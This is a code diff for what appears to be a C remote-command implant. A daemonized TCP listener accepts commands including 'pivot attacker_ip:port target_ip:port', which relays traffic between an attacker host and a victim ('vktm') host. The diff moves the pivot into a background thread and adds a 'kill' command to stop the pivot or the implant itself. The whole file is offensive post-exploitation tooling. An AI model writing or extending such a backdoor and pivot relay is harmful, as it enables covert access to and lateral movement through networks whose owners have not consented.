@@ -7,38 +7,40 @@
 #include <netinet/in.h>
 #include <strings.h>
 #include <arpa/inet.h>
+#include <bits/pthreadtypes.h>
+#include <pthread.h>
 #include "config.h"
-#include <sys/socket.h>
-#include <ctype.h>
+#include "commands.h"
+#include "main.h"
+#include "dbg.h"
 
 #ifdef DAEMON
 #include <sys/stat.h>
 #endif /* DAEMON */
 
-#include "commands.h"
-#include "main.h"
-#include "dbg.h"
-
 //TODO put SIGTERM cleanup function
 
 int sockfd, newsockfd;
+pthread_t pivot_thread_id = NULL;
 
-void PREFIX_pivot(char *argv, int argc){
-    struct PivotInput in;
-    char* pch = NULL;
-    char* atk = NULL;
-    char* atk_token = NULL;
-    char* target = NULL;
-    char* target_token = NULL;
+void PREFIX_pivot(char *argv, int argc) {
+    struct PivotInput *in = NULL;
+    char *pch = NULL;
+    char *atk = NULL;
+    char *atk_token = NULL;
+    char *target = NULL;
+    char *target_token = NULL;
     char def[] = "Pivot command usage: pivot attacker_ip:port target_ip:port\n";
+    int thread_error;
 
-    if(argc < 2 || argc > 2){
+    if (argc < 2 || argc > 2) {
         check_socket_write(write(newsockfd, &def, strlen(def)));
         return;
     }
+    in = malloc(sizeof(struct PivotInput));
     pch = strtok(argv, " ");
-    for (unsigned int argv_counter = 0;argv_counter < 2;argv_counter++)                                    //iterate over pch 2 times to get the right number of arguments
-    {
+    /* iterate over pch 2 times to get the right number of arguments */
+    for (unsigned int argv_counter = 0; argv_counter < 2; argv_counter++) {
         if (argv_counter == 0) {
             check_mem(atk = malloc(strlen(pch) + 1));
             /* Copy attacker ip:port */
@@ -53,21 +55,21 @@ void PREFIX_pivot(char *argv, int argc){
 
     }
     //TODO Convert repeated code to function
-    atk_token = strtok(atk,":");
-    for (unsigned int attacker_counter = 0; attacker_counter < 2; attacker_counter++){
-        if(atk_token == NULL){
+    atk_token = strtok(atk, ":");
+    for (unsigned int attacker_counter = 0; attacker_counter < 2; attacker_counter++) {
+        if (atk_token == NULL) {
             set_zero_errno();
             log_warn("Attacker argument format error");
             goto error;
         }
-        if(attacker_counter == 0) {
-            if (inet_pton(AF_INET, atk_token, &in.atk_ip) != 1) {
+        if (attacker_counter == 0) {
+            if (inet_pton(AF_INET, atk_token, &in->atk_ip) != 1) {
                 set_zero_errno();
                 log_warn("Attacker ip not valid");
                 goto error;
             }
         }
-        if(attacker_counter == 1) {
+        if (attacker_counter == 1) {
             long int atk_port = strtol(atk_token, NULL, 10);
             if (errno == ERANGE || atk_port == 0) {
                 set_zero_errno();
@@ -75,26 +77,26 @@ void PREFIX_pivot(char *argv, int argc){
                 goto error;
             }
             else {
-                in.atk_port = htons((uint16_t) atk_port);
+                in->atk_port = htons((uint16_t) atk_port);
             }
         }
-        atk_token = strtok(NULL,":");
+        atk_token = strtok(NULL, ":");
     }
-    target_token = strtok(target,":");
-    for (unsigned int target_counter = 0; target_counter < 2; target_counter++){
-        if(target_token == NULL){
+    target_token = strtok(target, ":");
+    for (unsigned int target_counter = 0; target_counter < 2; target_counter++) {
+        if (target_token == NULL) {
             set_zero_errno();
             log_warn("Target argument format error");
             goto error;
         }
-        if(target_counter == 0) {
-            if (inet_pton(AF_INET, target_token, &in.vktm_ip) != 1) {
+        if (target_counter == 0) {
+            if (inet_pton(AF_INET, target_token, &in->vktm_ip) != 1) {
                 set_zero_errno();
                 log_warn("Target ip not valid");
                 goto error;
             }
         }
-        if(target_counter == 1) {
+        if (target_counter == 1) {
             long int target_port = strtol(target_token, NULL, 10);
             if (errno == ERANGE || target_port == 0) {
                 set_zero_errno();
@@ -102,21 +104,27 @@ void PREFIX_pivot(char *argv, int argc){
                 goto error;
             }
             else {
-                in.vktm_port = htons((uint16_t) target_port);
+                in->vktm_port = htons((uint16_t) target_port);
             }
         }
-        target_token = strtok(NULL,":");
+        target_token = strtok(NULL, ":");
     }
-    pivot(&in);
+    thread_error = pthread_create(&pivot_thread_id, NULL, pivot, (void *) in);
+    if (thread_error != 0) {
+        log_err("cant create thread");
+        set_zero_errno();
+        goto error;
+    }
     free(atk);
     free(target);
 
     return;
 
     error:
-        if(atk) free(atk);
-        if(target) free(target);
-        return;
+    if (in) free(in);
+    if (atk) free(atk);
+    if (target) free(target);
+    return;
 }
 
 void PREFIX_ext(char *argv, int argc) {
@@ -134,7 +142,7 @@ void PREFIX_ls(char *argv, int argc) {
     return;
 
     error:
-        return;
+    return;
 }
 
 void PREFIX_arp(char *argv, int argc) {
@@ -168,6 +176,24 @@ void PREFIX_arp(char *argv, int argc) {
     free(resulthole);
 }
 
+void PREFIX_kill(char *argv, int argc) {
+    if (argc == 1) {
+        if (strcmp(argv, "pivot") == 0) {
+            if (kill_pivot() == 0) {
+                check_socket_write(write(newsockfd, "Pivot killed\n", 13));
+            }
+            else {
+                check_socket_write(write(newsockfd, "Error.\n", 7));
+            }
+        }
+        else if (strcmp(argv, "self") == 0) {
+            exit(0);
+        }
+    }
+    error:
+    return;
+}
+
 unsigned int cntargs(char *string)               //space delimited arguments counter
 {
     char *pch;                          //delimited token pointer
@@ -188,17 +214,18 @@ unsigned int cntargs(char *string)               //space delimited arguments cou
     return count;                                          //return the count result
 
     error:
-        return 0;
+    return 0;
 }
 
 void my_switch(char *string) {
 
     struct commandcase cases[] =
             {
-                    {"exit", PREFIX_ext},
-                    {"arp",  PREFIX_arp},
-                    {"ls",   PREFIX_ls},
-                    {"pivot", PREFIX_pivot}
+                    {"exit",  PREFIX_ext},
+                    {"arp",   PREFIX_arp},
+                    {"ls",    PREFIX_ls},
+                    {"pivot", PREFIX_pivot},
+                    {"kill",  PREFIX_kill}
             };
     char *e;
     size_t index;
@@ -287,8 +314,9 @@ int main(int argc, char *argv[]) {
     close(STDERR_FILENO);
 
 #endif /* DAEMON */
+
     bool socket_opened = false;                     // boolean variable to keep the success/fail state of the call to socket()
-    while(!socket_opened) {                         // loop until we successfully open a socket
+    while (!socket_opened) {                         // loop until we successfully open a socket
         /* call to socket() function */
         sockfd = socket(AF_INET, SOCK_STREAM, 0);
 
@@ -297,8 +325,7 @@ int main(int argc, char *argv[]) {
             sleep(5);                               // sleep for 5 seconds
             continue;                               // restart the loop
         }
-        else
-        {
+        else {
             socket_opened = true;                   // if we succeed set the socket state variable to true
         }
     }
@@ -318,14 +345,14 @@ int main(int argc, char *argv[]) {
     serv_addr.sin_port = htons(portno);
 
     bool socket_binded = false;                     // boolean variable to keep the success/fail state of the bind() call
-    while(!socket_binded) {                         // loop until we successfully bind
+    while (!socket_binded) {                         // loop until we successfully bind
         /* Now bind the host address using bind() call.*/
         if (bind(sockfd, (struct sockaddr *) &serv_addr, sizeof(serv_addr)) < 0) {
             log_err("ERROR on binding");            // log error
             sleep(5);                               // sleep for 5 seconds
             continue;                               // restart the loop
         }
-        else{
+        else {
             socket_binded = true;                   // if we succeed set the bind state variable to true
         }
     }
@@ -370,8 +397,10 @@ int main(int argc, char *argv[]) {
             log_err("ERROR writing to socket"); // log error
             continue;                           // restart the loop
         }
-        FILE *fd = fdopen(dup(newsockfd), "w"); // create a duplicate socket converted after to file descriptor to use fprintf
-        n = PRINT_VERSION(fd)                   // macro with fprintf version information, referenced information can be found in config.h.in
+        FILE *fd = fdopen(dup(newsockfd),
+                          "w"); // create a duplicate socket converted after to file descriptor to use fprintf
+        n = PRINT_VERSION(
+                    fd)                   // macro with fprintf version information, referenced information can be found in config.h.in
         fflush(fd);                             // flush the descriptor
         fclose(fd);                             // close and cleanup
         if (n <= 0) {                           // if we had an error with write
